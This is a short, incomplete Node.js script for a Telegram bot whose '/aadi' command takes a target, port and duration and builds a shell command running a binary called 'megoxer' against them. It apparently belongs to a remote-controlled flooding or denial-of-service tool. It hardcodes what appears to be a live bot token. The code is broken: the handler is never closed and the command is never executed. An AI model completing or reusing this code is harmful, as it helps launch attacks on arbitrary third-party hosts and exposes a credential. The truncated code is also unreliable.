const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');

// Replace with your actual Telegram bot token
const token = '7324603047:AAE5tXfan8-JWMBoIL4B9LlnddaUsi3F2Zg';
const bot = new TelegramBot(token, { polling: true });


bot.onText(/\/aadi (.+) (.+) (.+)/, (msg, match) => {
    const userId = msg.chat.id.toString();
    const target = match[1];
    const port = match[2];
    const time = match[3];
const commandToRun = `./megoxer ${target} ${port} ${time} 900`;

// Start the bot
console.log("Bot is running...");
